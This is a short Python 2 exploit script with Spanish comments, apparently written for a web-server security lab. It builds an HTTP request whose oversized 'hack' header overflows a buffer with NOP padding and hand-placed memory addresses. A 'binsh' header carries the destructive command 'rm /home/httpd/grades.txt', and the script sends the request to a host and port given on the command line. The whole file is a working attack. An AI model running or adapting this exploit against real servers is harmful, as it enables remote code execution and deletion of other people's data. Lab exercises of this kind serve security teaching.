#!/usr/bin/env python2
import sys
import socket
import traceback
import urllib
import struct

# Buffer
buf = "\xa0\x4d\x06\x40HACK\xa3\x11\x05\x08"

# Funcion para rellenar el buffer
def rellenar(longitud):
    relleno = "\x90" #nop instruccion
    relleno*= longitud
    
    return relleno

# Funcion para armar el exploit
def build_exploit():
    req =   "GET / HTTP/1.0\r\n" + \
	        "binsh: rm /home/httpd/grades.txt" + "\r\n" + \
	        "hack: " + rellenar(536) + buf + "\r\n" + \
	    "\r\n"

    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    req = build_exploit()
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

